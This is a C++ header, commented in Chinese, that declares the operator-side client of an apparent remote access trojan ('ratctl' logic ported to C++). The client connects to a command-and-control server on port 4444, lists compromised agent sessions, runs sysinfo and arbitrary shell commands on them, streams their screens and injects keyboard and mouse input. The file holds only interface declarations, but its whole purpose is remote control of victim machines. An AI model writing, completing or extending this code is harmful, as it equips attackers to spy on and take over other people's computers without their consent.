// ctl_client.h — im_ctl 的 CONTROL 客户端（移植 ratctl 逻辑到 C++）
// 单条 ctl TCP 长连接 + 后台读线程；支持会话列表/业务指令/屏幕流。
#pragma once

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <winsock2.h>

#include <atomic>
#include <condition_variable>
#include <cstddef>
#include <cstdint>
#include <functional>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "../../client/core/protocol.h"

namespace ctl {

struct SessionInfo {
    std::string id;        // agent_id hex
    std::string ip;
    uint16_t port = 0;
    std::string os;
    uint32_t plugins = 0;
    uint64_t lastSeenMs = 0;
    bool online = false;
};

// 屏幕帧回调（读线程调用；调用方负责拷贝/队列）
using FrameCallback = std::function<void(uint32_t seq, int w, int h,
                                         const uint8_t* jpeg, size_t len)>;

class CtlClient {
public:
    CtlClient() = default;
    ~CtlClient();

    // 连接 c2server:4444 + 握手（CONTROL 角色）+ 启动读线程
    bool connect(const std::string& host, uint16_t port, std::string& err);
    void disconnect();

    // 同步发一条指令并等待响应（seq 全局递增；超时 ms）
    bool sendAndWait(uint16_t cmd, uint8_t plugin, const std::vector<uint8_t>& payload,
                     uint16_t wantCmd, uint8_t& status, std::vector<uint8_t>& body,
                     std::string& err, int timeoutMs = 240000);

    // 便捷命令
    bool listSessions(std::vector<SessionInfo>& out, std::string& err);
    bool sysinfo(const std::string& agentId, std::string& result, std::string& err);
    bool exec(const std::string& agentId, const std::string& command,
              std::string& result, std::string& err);
    bool screenStream(const std::string& agentId, uint8_t control,
                      uint8_t fps, uint8_t quality, uint8_t scalePercent,
                      std::string& err);

    // 发送输入事件（协议 §9.3）：payload = agent_id(16) + count + InputEvent[]
    bool sendInputEvents(const std::string& agentId,
                         const std::vector<c2::InputEvent>& events,
                         std::string& err);

    void setFrameCallback(FrameCallback cb) { frameCb_ = std::move(cb); }
    bool connected() const { return sock_ != INVALID_SOCKET; }

private:
    void readLoop();
    bool handshake(std::string& err);
    bool sendRaw(uint16_t cmd, uint8_t plugin, const std::vector<uint8_t>& payload,
                 uint32_t seq);
    bool business(uint16_t cmd, const std::string& agentId,
                  const std::vector<uint8_t>& args,
                  std::string& result, std::string& err,
                  int timeoutMs = 240000);

    SOCKET sock_ = INVALID_SOCKET;
    std::vector<uint8_t> key_;   // 会话密钥
    std::atomic<uint32_t> seq_{0};
    std::atomic<bool> running_{false};
    std::thread reader_;

    // 防重放（读线程）
    std::mutex seqMx_;
    uint32_t lastSeq_ = 0;

    // 待响应（seq -> 结果）
    struct Pending {
        std::mutex mx;
        std::condition_variable cv;
        bool done = false;
        uint16_t cmd = 0;
        uint8_t status = 0;
        std::vector<uint8_t> body;
    };
    std::mutex pendMx_;
    std::map<uint32_t, Pending*> pend_;

    std::mutex sendMx_;  // 串行化所有 send（命令线程 + UI 发送线程并发写安全）

    FrameCallback frameCb_;
};

// 解码 JPEG（WIC）→ BGRA 像素；成功返回 true 并输出 w/h/像素
bool decode_jpeg_to_bgra(const uint8_t* jpeg, size_t len,
                         int& w, int& h, std::vector<uint8_t>& bgra);

}  // namespace ctl
